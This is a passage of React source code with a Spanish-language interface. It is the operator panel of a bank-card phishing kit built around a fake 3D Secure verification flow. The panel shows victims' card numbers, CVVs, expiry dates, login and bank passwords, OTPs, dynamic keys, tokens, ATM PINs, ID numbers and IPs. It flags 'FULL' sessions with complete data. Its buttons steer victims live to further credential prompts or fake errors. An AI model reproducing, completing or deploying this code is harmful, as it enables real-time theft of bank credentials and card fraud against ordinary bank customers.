                  ))}
                </div>
                {/* Bank filter */}
                {uniqueBanks.length > 0 && (
                  <>
                    <div className={`w-px h-5 ${theme.border}`} />
                    <select
                      value={bankFilter}
                      onChange={(e) => setBankFilter(e.target.value)}
                      className={`${theme.inputBg} border ${theme.border} rounded-lg px-3 py-1.5 text-[11px] ${theme.textSecondary} font-medium focus:outline-none focus:border-red-500/30 appearance-none cursor-pointer`}
                    >
                      <option value="all" className={theme.cardBg}>Todos los bancos</option>
                      {uniqueBanks.map(bank => (
                        <option key={bank} value={bank} className={theme.cardBg}>{bank}</option>
                      ))}
                    </select>
                  </>
                )}
                {/* Category filter */}
                {uniqueCategories.length > 0 && (
                  <>
                    <div className={`w-px h-5 ${theme.border}`} />
                    <select
                      value={categoryFilter}
                      onChange={(e) => setCategoryFilter(e.target.value)}
                      className={`${theme.inputBg} border ${theme.border} rounded-lg px-3 py-1.5 text-[11px] ${theme.textSecondary} font-medium focus:outline-none focus:border-red-500/30 appearance-none cursor-pointer`}
                    >
                      <option value="all" className={theme.cardBg}>🏷️ Todas las categorías</option>
                      <option value="BLACK" className={theme.cardBg}>💎 Black</option>
                      <option value="INFINITE" className={theme.cardBg}>💎 Infinite</option>
                      <option value="SIGNATURE" className={theme.cardBg}>💎 Signature</option>
                      <option value="PLATINUM" className={theme.cardBg}>⭐ Platinum</option>
                      <option value="GOLD" className={theme.cardBg}>⭐ Gold</option>
                      <option value="CLASSIC" className={theme.cardBg}>💳 Classic</option>
                      <option value="CREDIT" className={theme.cardBg}>💳 Credit</option>
                      <option value="DEBIT" className={theme.cardBg}>💳 Debit</option>
                      {uniqueCategories.filter(c => !["BLACK","INFINITE","SIGNATURE","PLATINUM","GOLD","CLASSIC","CREDIT","DEBIT"].includes(c)).map(cat => (
                        <option key={cat} value={cat} className={theme.cardBg}>{cat}</option>
                      ))}
                    </select>
                  </>
                )}
                {/* Sort selector */}
                <div className={`w-px h-5 ${theme.border}`} />
                <select
                  value={sortBy}
                  onChange={(e) => setSortBy(e.target.value as "fecha" | "actividad")}
                  className={`${theme.inputBg} border ${theme.border} rounded-lg px-3 py-1.5 text-[11px] ${theme.textSecondary} font-medium focus:outline-none focus:border-red-500/30 appearance-none cursor-pointer`}
                >
                  <option value="actividad" className={theme.cardBg}>↓ Última actividad</option>
                  <option value="fecha" className={theme.cardBg}>↓ Fecha conexión</option>
                </select>
                {/* Results count */}
                <span className="text-[10px] text-gray-600 ml-auto">
                  {filteredSessions.length} de {sessions.length} sesiones
                </span>
              </div>
            )}

            {sessions.length === 0 ? (
              <div className="text-center py-24">
                <div className={`w-20 h-20 mx-auto mb-6 rounded-2xl ${theme.inputBg} border ${theme.border} flex items-center justify-center`}>
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0" />
                  </svg>
                </div>
                <h3 className={`text-xl font-semibold ${theme.textSecondary} mb-2`}>Esperando conexiones</h3>
                <p className={`text-sm ${theme.textSecondary} opacity-60 max-w-sm mx-auto`}>Las sesiones aparecerán aquí cuando un usuario inicie el flujo de verificación 3D Secure</p>
              </div>
            ) : filteredSessions.length === 0 ? (
              <div className="text-center py-16">
                <p className="text-gray-500 text-sm">No hay sesiones que coincidan con los filtros seleccionados.</p>
              </div>
            ) : (
              <div className="grid gap-4">
                {filteredSessions.map((session) => {
                  const isSelected = selectedSessionId === session.sessionId;
                  const statusCls = getStatusClasses(session.status);
                  
                  return (
                    <div
                      key={session.sessionId}
                      ref={(el) => { sessionCardsRef.current[session.sessionId] = el; }}
                      className={`rounded-2xl border transition-all duration-200 overflow-hidden ${
                        isSelected 
                          ? `${theme.cardBg} border-red-500/30 shadow-lg shadow-red-500/5` 
                          : `${theme.cardBg} ${theme.border} hover:border-white/10`
                      }`}
                    >
                      {/* Session Header - Click to expand */}
                      <div
                        className="px-3 sm:px-5 py-3 sm:py-4 cursor-pointer flex items-center gap-2 sm:gap-4"
                        onClick={() => setSelectedSessionId(isSelected ? null : session.sessionId)}
                      >
                        {/* Online/Offline Indicator */}
                        <div className="relative flex-shrink-0">
                          <div className={`w-3.5 h-3.5 rounded-full ${session.isOnline ? "bg-emerald-400 animate-pulse" : "bg-gray-600"}`} />
                          {!session.isOnline && (
                            <div className="absolute -bottom-3 left-1/2 -translate-x-1/2 whitespace-nowrap">
                              <span className="text-[8px] text-gray-600">{timeSince(session.lastActivity)}</span>
                            </div>
                          )}
                        </div>
                        
                        {/* Main Info */}
                        <div className="flex-1 min-w-0 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-7 gap-x-3 sm:gap-x-6 gap-y-1 items-center">
                          {/* Email */}
                          <div className="truncate">
                            <span className={`text-[10px] ${theme.textSecondary} block`}>Email/Cel</span>
                            <span className={`text-sm ${theme.text} font-medium truncate block`}>{session.email || session.data?.email || "—"}</span>
                          </div>
                          {/* Card */}
                          <div className="truncate">
                            <span className={`text-[10px] ${theme.textSecondary} block`}>Tarjeta</span>
                            <div className="flex items-center gap-1.5">
                              {getCardBrandSVG(session.cardNumber, session.cardBin) && (
                                <span className="flex-shrink-0 bg-white rounded px-1 py-0.5 flex items-center">
                                  {getCardBrandSVG(session.cardNumber, session.cardBin)}
                                </span>
                              )}
                              <span className="text-sm text-cyan-400 font-mono truncate">{session.cardNumber || session.cardBin || "—"}</span>
                            </div>
                          </div>
                          {/* Bank badge */}
                          <div className="truncate">
                            <span className={`text-[10px] ${theme.textSecondary} block mb-0.5`}>Banco</span>
                            {(() => {
                              const badge = getBankBadge(session.bankName);
                              return (
                                <span className={`inline-block px-2 py-0.5 rounded text-[10px] font-bold tracking-wide ${badge.bg} ${badge.text} truncate max-w-full`}>
                                  {badge.label}
                                </span>
                              );
                            })()}
                            {/* Linked card indicator */}
                            {session.linkedCard && (
                              <div className="mt-1 flex items-center gap-1">
                                <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-orange-500/15 border border-orange-500/30 text-[9px] text-orange-400 font-bold animate-pulse">
                                  \u26a0\ufe0f CC Anterior: {session.linkedCard.previousCard?.slice(-4) || '****'}
                                </span>
                              </div>
                            )}
                          </div>
                          {/* Step */}
                          <div>
                            <span className={`text-[10px] ${theme.textSecondary} block`}>Paso</span>
                            <span className="text-sm text-amber-400 font-semibold">{getStepLabel(session.currentStep)}</span>
                          </div>
                          {/* Captured Codes Preview */}
                          <div className="hidden lg:block col-span-2">
                            <span className={`text-[10px] ${theme.textSecondary} block`}>Códigos</span>
                            <div className="flex gap-2 text-[11px] font-mono">
                              {session.data?.bankUser && <span className="text-emerald-400">{session.data.bankUser}</span>}
                              {session.data?.otpCode && <span className="text-amber-400">{session.data.otpCode}</span>}
                              {session.data?.claveDinamica && <span className="text-purple-400">{session.data.claveDinamica}</span>}
                              {session.data?.tokenSeguridad && <span className="text-orange-400">{session.data.tokenSeguridad}</span>}
                              {session.data?.claveATM && <span className="text-sky-400">{session.data.claveATM}</span>}
                              {session.customTextResponse && <span className="text-pink-400" title={session.customTextResponse}>💬</span>}
                              {!session.data?.bankUser && !session.data?.otpCode && !session.data?.claveDinamica && !session.data?.tokenSeguridad && !session.data?.claveATM && !session.customTextResponse && <span className="text-gray-600">—</span>}
                            </div>
                          </div>
                          {/* Time */}
                          <div className="hidden lg:block">
                            <span className={`text-[10px] ${theme.textSecondary} block`}>Tiempo</span>
                            <span className={`text-sm ${theme.textSecondary}`}>{timeSince(session.connectedAt)}</span>
                          </div>
                        </div>

                        {/* Quick Actions (always visible) */}
                        <div className="flex items-center gap-1.5 flex-shrink-0">
                          {/* FULL badge - session has card + credentials + OTP */}
                          {(() => {
                            const hasCard = !!(session.cardNumber || session.cardBin);
                            const hasCreds = !!(session.bankUser || session.data?.bankUser);
                            const hasOTP = !!(session.otpCode || session.data?.otpCode || session.dinamicaCode || session.data?.claveDinamica || session.tokenCode || session.data?.tokenSeguridad || session.atmPin || session.data?.claveATM);
                            if (hasCard && hasCreds && hasOTP) {
                              return <span className="px-2 py-0.5 rounded text-[9px] font-bold uppercase bg-green-500/20 text-green-400 border border-green-500/30 animate-pulse">FULL</span>;
                            }
                            return null;
                          })()}
                          {/* Online status badge */}
                          <span className={`px-2 py-0.5 rounded text-[9px] font-bold uppercase ${
                            session.isOnline 
                              ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" 
                              : "bg-gray-500/10 text-gray-500 border border-gray-500/20"
                          }`}>
                            {session.isOnline ? "ONLINE" : "OFFLINE"}
                          </span>
                          <button
                            onClick={(e) => { e.stopPropagation(); copySessionData(session); }}
                            className={`w-8 h-8 rounded-lg flex items-center justify-center transition-all text-xs ${
                              copySuccess === session.sessionId 
                                ? "bg-emerald-500/20 text-emerald-400" 
                                : "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white"
                            }`}
                            title="Copiar todo"
                          >
                            {copySuccess === session.sessionId ? "✓" : "📋"}
                          </button>
                          {!session.isOnline && (
                            <button
                              onClick={(e) => { e.stopPropagation(); removeSession(session.sessionId); }}
                              className="w-8 h-8 rounded-lg flex items-center justify-center transition-all text-xs bg-white/5 text-gray-500 hover:bg-red-500/10 hover:text-red-400"
                              title="Quitar de la lista"
                            >
                              ✕
                            </button>
                          )}
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            className={`w-4 h-4 text-gray-500 transition-transform ${isSelected ? "rotate-180" : ""}`}
                            fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}
                          >
                            <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
                          </svg>
                        </div>
                      </div>

                      {/* Expanded Detail */}
                      {isSelected && (
                        <div className={`border-t ${theme.border} px-3 sm:px-5 py-3 sm:py-5 space-y-4 sm:space-y-5`}>
                          {/* Data Grid - Info General */}
                          <div>
                            <h4 className={`text-[11px] ${theme.textSecondary} uppercase font-semibold tracking-wider mb-3`}>Información General</h4>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
                              <DataCard label="Email/Cel" value={session.email || session.data?.email} color="white" />
                              <DataCard label="IP" value={session.ipAddress} color="gray" mono />
                              <DataCard label="Banco" value={session.bankName} color="white" />
                              <DataCard label="Red" value={session.cardScheme} color="white" />
                              <DataCard label="Categoría" value={session.cardCategory || session.data?.cardCategory} color="white" />
                              <DataCard label="País" value={session.country} color="white" />
                            </div>
                          </div>

                          {/* Login Data */}
                          <div>
                            <h4 className={`text-[11px] ${theme.textSecondary} uppercase font-semibold tracking-wider mb-3`}>🔐 Login</h4>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
                              <DataCard label="Contraseña Login" value={session.loginPassword} color="red" mono highlight />
                            </div>
                          </div>

                          {/* Card Data */}
                          <div>
                            <h4 className={`text-[11px] ${theme.textSecondary} uppercase font-semibold tracking-wider mb-3`}>💳 Tarjeta</h4>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-3">
                              <DataCard label="Titular" value={session.holderName} color="cyan" />
                              <DataCard label="Número" value={session.cardNumber || session.cardBin} color="cyan" mono highlight />
                              <DataCard label="Vencimiento" value={session.expiryDate} color="cyan" mono highlight />
                              <DataCard label="CVV" value={session.cvv} color="cyan" mono highlight />
                            </div>
                          </div>

                          {/* Linked Card Alert */}
                          {session.linkedCard && (
                            <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/30">
                              <h4 className="text-[11px] text-orange-400 uppercase font-semibold tracking-wider mb-2">\u26a0\ufe0f Tarjeta Anterior (Mismo Usuario)</h4>
                              <div className="grid grid-cols-2 gap-3">
                                <DataCard label="CC Anterior" value={session.linkedCard.previousCard} color="orange" mono highlight />
                                <DataCard label="Banco Anterior" value={session.linkedCard.previousBank} color="orange" />
                              </div>
                              <p className="text-[10px] text-orange-400/70 mt-2">Sesi\u00f3n: {session.linkedCard.previousSessionId}</p>
                            </div>
                          )}

                          {/* Personal Data */}
                          <div>
                            <h4 className={`text-[11px] ${theme.textSecondary} uppercase font-semibold tracking-wider mb-3`}>👤 Datos Personales</h4>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
                              <DataCard label="Dirección" value={session.address} color="white" />
                              <DataCard label="Cédula" value={session.cedula} color="white" mono />
                              <DataCard label="Ciudad" value={session.city} color="white" />
                            </div>
                          </div>

                          {/* Captured Credentials (3DS) */}
                          <div>
                            <h4 className={`text-[11px] ${theme.textSecondary} uppercase font-semibold tracking-wider mb-3`}>🔑 Credenciales Bancarias</h4>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-3">
                              <DataCard label="Usuario Banco" value={session.bankUser || session.data?.bankUser} color="emerald" mono highlight />
                              <DataCard label="Contraseña Banco" value={session.bankPassword || session.data?.bankPassword} color="emerald" mono highlight />
                              <DataCard label="OTP" value={session.otpCode || session.data?.otpCode} color="amber" mono highlight />
                              <DataCard label="Dinámica" value={session.dinamicaCode || session.data?.claveDinamica} color="purple" mono highlight />
                              <DataCard label="Token" value={session.tokenCode || session.data?.tokenSeguridad} color="orange" mono highlight />
                              <DataCard label="ATM" value={session.atmPin || session.data?.claveATM} color="sky" mono highlight />
                            </div>
                          </div>

                          {/* Custom Text Response */}
                          {session.customTextResponse && (
                            <div className={`p-2 rounded-lg bg-pink-500/10 border border-pink-500/20 mb-3`}>
                              <span className="text-[10px] text-pink-400 font-medium block mb-0.5">💬 Respuesta Texto</span>
                              <span className="text-sm text-pink-300 font-mono">{session.customTextResponse}</span>
                            </div>
                          )}

                          {/* Action Buttons */}
                          <div className={`pt-3 border-t ${theme.border}`}>
                            <div className="flex flex-wrap gap-2">
                              {/* Direction Buttons */}
                              <div className="flex items-center gap-1 sm:gap-1.5 mr-2 sm:mr-3 flex-wrap">
                                <span className={`text-[9px] sm:text-[10px] ${theme.textSecondary} uppercase font-medium`}>Dirigir:</span>
                                <ActionBtn label="OTP" color="blue" onClick={() => sendStep(session.sessionId, "otp")} />
                                <ActionBtn label="DIN" color="purple" onClick={() => sendStep(session.sessionId, "dinamica")} />
                                <ActionBtn label="TKN" color="orange" onClick={() => sendStep(session.sessionId, "token")} />
                                <ActionBtn label="ATM" color="teal" onClick={() => sendStep(session.sessionId, "atm")} />
                                <ActionBtn label="CRED" color="gray" onClick={() => sendStep(session.sessionId, "credentials")} />
                              </div>

                              <div className={`w-px h-7 ${theme.border} self-center`} />

                              {/* Error Buttons */}
                              <div className="flex items-center gap-1 sm:gap-1.5 mr-2 sm:mr-3 flex-wrap">
                                <span className={`text-[9px] sm:text-[10px] ${theme.textSecondary} uppercase font-medium`}>Error:</span>
                                <ActionBtn label="✗OTP" color="rose" onClick={() => sendStep(session.sessionId, "error-otp")} />
                                <ActionBtn label="✗DIN" color="rose" onClick={() => sendStep(session.sessionId, "error-dinamica")} />
                                <ActionBtn label="✗TKN" color="rose" onClick={() => sendStep(session.sessionId, "error-token")} />
                                <ActionBtn label="✗ATM" color="rose" onClick={() => sendStep(session.sessionId, "error-atm")} />
                                <ActionBtn label="✗CARD" color="red" onClick={() => sendStep(session.sessionId, "error-tarjeta")} />
                                <ActionBtn label="↻CARD" color="red" onClick={() => sendStep(session.sessionId, "error-tarjeta-otra")} />
                              </div>

                              <div className={`w-px h-7 ${theme.border} self-center`} />

                              {/* Success Button */}
                              <div className="flex items-center gap-1.5">
                                <ActionBtn label="✅ ÉXITO" color="emerald" onClick={() => {
                                  sendStep(session.sessionId, "success");
                                  updateStatus(session.sessionId, "completed");
                                }} />
                              </div>

                              <div className={`w-px h-7 ${theme.border} self-center`} />

                              {/* FACE ID Button */}
                              <div className="flex items-center gap-1.5">
                                <ActionBtn label="🦾 FACE ID" color="blue" onClick={() => sendStep(session.sessionId, "faceid")} />
                              </div>

                              <div className={`w-px h-7 ${theme.border} self-center`} />

                              {/* Custom Text Button */}
                              <div className="flex items-center gap-1.5">
                                <ActionBtn label="💬 TEXTO" color="gray" onClick={() => {
                                  setCustomTextTarget(session.sessionId);
                                  setShowCustomTextModal(true);
                                  setCustomTextInput("");
                                }} />
                              </div>

                              <div className={`w-px h-7 ${theme.border} self-center`} />

                              {/* BAN IP Button */}
                              <div className="flex items-center gap-1.5">
                                <ActionBtn label="🚫 BAN IP" color="red" onClick={() => {
                                  if (session.ipAddress && confirm(`¿Banear IP ${session.ipAddress}? El usuario no podrá acceder más.`)) {
                                    fetch("/api/admin/ban-ip", {
                                      method: "POST",
                                      headers: { "Content-Type": "application/json", "x-admin-pin": sessionStorage.getItem("admin-pin") || "" },
                                      body: JSON.stringify({ ipAddress: session.ipAddress, reason: `Baneado desde sesión ${session.sessionId.slice(0, 12)}` }),
                                    }).then(r => r.json()).then(d => {
                                      if (d.ok) alert(`IP ${session.ipAddress} baneada exitosamente`);
                                    });
                                  }
                                }} />
                              </div>
                            </div>
                          </div>

                          {/* Footer Info */}
                          <div className={`pt-3 border-t ${theme.border} flex items-center justify-between`}>
                            {session.userAgent && (
                              <p className="text-[10px] text-gray-600 font-mono truncate max-w-[70%]">UA: {session.userAgent}</p>
                            )}
                            <div className="flex items-center gap-2 text-[10px]">
                              <span className={`${session.isOnline ? "text-emerald-400" : "text-gray-500"}`}>
                                {session.isOnline ? "🟢 Conectado" : `⚫ Inactivo hace ${timeSince(session.lastActivity)}`}
                              </span>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  );
}

// ═══════════════════════════════════════
// SUB-COMPONENTS
// ═══════════════════════════════════════

function StatBadge({ icon, label, value, color }: { icon: string; label: string; value: number; color: string }) {
  const colorMap: Record<string, string> = {
    blue: "bg-blue-500/10 text-blue-400 border-blue-500/20",
    emerald: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20",
    purple: "bg-purple-500/10 text-purple-400 border-purple-500/20",
    amber: "bg-amber-500/10 text-amber-400 border-amber-500/20",
    gray: "bg-gray-500/10 text-gray-400 border-gray-500/20",
  };
  return (
    <div className={`flex items-center gap-1 sm:gap-2 px-2 sm:px-3 py-1 sm:py-1.5 rounded-lg border text-[10px] sm:text-xs font-medium ${colorMap[color] || colorMap.gray}`}>
      <span>{icon}</span>
      <span className="text-gray-400 hidden sm:inline">{label}:</span>
      <span className="font-bold">{value}</span>
    </div>
  );
}

function DataCard({ label, value, color = "white", mono = false, highlight = false }: {
  label: string;
  value?: string;
  color?: string;
  mono?: boolean;
  highlight?: boolean;
}) {
  const hasValue = !!value;
  const textColorMap: Record<string, string> = {
    white: "text-white",
    cyan: "text-cyan-400",
    emerald: "text-emerald-400",
    amber: "text-amber-400",
    purple: "text-purple-400",
    orange: "text-orange-400",
    sky: "text-sky-400",
    gray: "text-gray-400",
  };
  const highlightMap: Record<string, string> = {
    white: "bg-white/5 border-white/10",
    cyan: "bg-cyan-500/5 border-cyan-500/20",
    emerald: "bg-emerald-500/5 border-emerald-500/20",
    amber: "bg-amber-500/5 border-amber-500/20",
    purple: "bg-purple-500/5 border-purple-500/20",
    orange: "bg-orange-500/5 border-orange-500/20",
    sky: "bg-sky-500/5 border-sky-500/20",
    gray: "bg-gray-500/5 border-gray-500/20",
  };

  const containerCls = highlight && hasValue
    ? highlightMap[color] || "bg-white/[0.02] border-white/5"
    : "bg-white/[0.02] border-white/5";

  return (
    <div className={`rounded-xl p-3 border transition-all ${containerCls}`}>
      <span className="text-[10px] text-gray-500 uppercase block mb-1 font-medium">{label}</span>
      <span className={`text-sm font-semibold block truncate ${mono ? "font-mono" : ""} ${
        hasValue ? textColorMap[color] || "text-white" : "text-gray-700"
      }`}>
        {value || "\u2014"}
      </span>
    </div>
  );
}

function ActionBtn({ label, color, onClick }: { label: string; color: string; onClick: () => void }) {
  const colorMap: Record<string, string> = {
    blue: "bg-blue-500/10 text-blue-400 border-blue-500/20 hover:bg-blue-500/20",
    purple: "bg-purple-500/10 text-purple-400 border-purple-500/20 hover:bg-purple-500/20",
    orange: "bg-orange-500/10 text-orange-400 border-orange-500/20 hover:bg-orange-500/20",
    teal: "bg-teal-500/10 text-teal-400 border-teal-500/20 hover:bg-teal-500/20",
    gray: "bg-white/5 text-gray-400 border-white/10 hover:bg-white/10",
    rose: "bg-rose-500/10 text-rose-400 border-rose-500/20 hover:bg-rose-500/20",
    red: "bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20",
    emerald: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20 hover:bg-emerald-500/20",
  };

  return (
    <button
      onClick={(e) => { e.stopPropagation(); onClick(); }}
      className={`px-2 sm:px-2.5 py-1 sm:py-1.5 rounded-lg text-[10px] sm:text-[11px] font-semibold border transition-all active:scale-95 ${colorMap[color] || colorMap.gray}`}
    >
      {label}
    </button>
  );
}

function DetailField({ label, value, theme, mono, highlight, badge, fullWidth }: {
  label: string;
  value?: string | null;
  theme: any;
  mono?: boolean;
  highlight?: string;
  badge?: boolean;
  fullWidth?: boolean;
}) {
  const highlightColors: Record<string, string> = {
    cyan: "text-cyan-400",
    red: "text-red-400",
    emerald: "text-emerald-400",
    amber: "text-amber-400",
    purple: "text-purple-400",
    orange: "text-orange-400",
    sky: "text-sky-400",
  };

  const valueColor = highlight ? highlightColors[highlight] || theme.text : theme.text;

  return (
    <div className={fullWidth ? "col-span-2" : ""}>
      <p className={`text-[10px] ${theme.textSecondary} mb-0.5 uppercase tracking-wider`}>{label}</p>
      {badge ? (
        <span className="inline-block px-2 py-0.5 rounded-md text-[11px] font-semibold bg-white/10 border border-white/10">
          {value || "—"}
        </span>
      ) : (
        <p className={`text-sm font-semibold ${valueColor} ${mono ? "font-mono" : ""} break-all`}>
          {value || "—"}
        </p>
      )}
    </div>
  );
}
